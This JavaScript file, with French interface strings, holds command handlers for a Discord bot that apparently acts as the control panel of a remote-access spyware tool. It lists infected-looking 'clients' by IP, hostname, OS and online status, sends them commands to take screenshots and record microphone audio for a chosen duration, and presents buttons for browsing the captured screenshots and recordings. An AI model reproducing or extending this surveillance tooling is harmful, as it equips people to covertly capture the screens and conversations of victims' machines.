import {ActionRowBuilder, ButtonBuilder} from "discord.js";
import {commands} from "../commands.js";
import {executeRequestWithTokenRefresh} from "./token.js";
import {createEmbed} from "./utils.js";
import config from "../static/config.json" assert {type: 'json'};
const {API_BASE_URL} = config;

export const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    const embed = createEmbed('Aide', 'Voici la liste des commandes disponibles :', commands.map(command => ({
        name: `/${command.name}`,
        value: command.description,
    })));
    await interaction.editReply({ embeds: [embed] });
};

export const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients/${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await executeRequestWithTokenRefresh(url);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }
        const embeds = clients.map(client => createEmbed(`Client ${client.id || 'Client sans nom'} / ${client.ip}`,
            `**OS :** ${client.os}\n` +
            `**Version :** ${client.os_version}\n` +
            `**Hostname :** ${client.hostname}\n` +
            `**Créé le :** ${client.date_created}\n` +
            `**Mis à jour le :** ${client.date_updated}\n` +
            `**Statut :** ${client.status.toUpperCase()}`,
            [],
            client.status === 'online' ? '#00FF00' : '#FF0000'
        ));

        await interaction.editReply({ embeds });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

export const handleStopCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    await interaction.editReply('Arrêt du bot...');
    process.exit(0);
};

export const handleScreenshotCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ ephemeral: true });
    const url = `${API_BASE_URL}/command/${clientId}`;
    try {
        await executeRequestWithTokenRefresh(url, { method: 'POST', data: { command: 'screenshot' } });
        await interaction.editReply(`${commands.find(command => command.name === 'screenshot').description}`);
    } catch (error) {
        console.error("Erreur lors de l'envoi de la commande", error);
        await interaction.editReply("Erreur lors de l'envoi de la commande.");
    }
}

export const handleMicrophoneCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    const duration = interaction.options.getInteger('duration');
    await interaction.deferReply({ ephemeral: true });

    const url = `${API_BASE_URL}/command/${clientId}`;
    const data = {
        command: 'audio',
        params: { duration }
    };

    try {
        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
        await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId}...`);

        let elapsedSeconds = 0;
        const intervalId = setInterval(async () => {
            elapsedSeconds++;
            const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
            await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
            if (elapsedSeconds >= duration) {
                clearInterval(intervalId);
                await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
            }
        }, 1000);

    } catch (error) {
        console.error("Erreur lors de l'envoi de la commande d'enregistrement audio", error);
        await interaction.editReply("Erreur lors de l'envoi de la commande d'enregistrement audio.");
        clearInterval(intervalId);
    }
};

export const handleListAllScreenshotsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    try {
        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const buttons = clients.map(client =>
            new ButtonBuilder()
                .setCustomId(`screenshot_${client.id}`)
                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                .setStyle(1)
        );

        const components = [];
        for (let i = 0; i < buttons.length; i += 5) {
            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
            components.push(actionRow);
        }

        await interaction.editReply({ content: "Sélectionnez un client pour voir les captures d'écran :", components });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

export const handleListAllMicrophonesCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    try {
        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const buttons = clients.map(client =>
            new ButtonBuilder()
                .setCustomId(`microphone_${client.id}`)
                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                .setStyle(1)
        );

        const components = [];
        for (let i = 0; i < buttons.length; i += 5) {
            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
            components.push(actionRow);
        }

        await interaction.editReply({ content: "Sélectionnez un client pour voir les enregistrements audio :", components });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};
